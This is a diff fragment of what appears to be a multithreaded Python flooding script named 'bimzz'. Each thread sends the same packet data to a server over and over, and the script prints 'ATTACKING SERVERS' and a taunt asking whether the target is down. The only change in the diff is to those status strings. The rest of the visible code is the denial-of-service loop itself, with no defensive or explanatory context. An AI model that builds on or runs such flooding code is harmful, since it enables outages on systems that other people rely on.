@@ -50,9 +50,9 @@ def bimzz():
             s.sendto(bimzz_data)
             for x in range(paket_bimzz):
                 s.sendto(bimzz_data)
-            print("[•] BIMZZ ATTACKING SERVERS!!!")
+            print("[Bimzz] BIMZZ ATTACKING SERVERS!!!")
         except:
-            print("[•] Yah Down Yah? Awokwsaowkswosk!!!")
+            print("[Bimzz] Yah Down Yah? Awokwsaowkswosk!!!")
             
 for y in range(threads_bimzz):
     th = threading.Thread(target=bimzz)
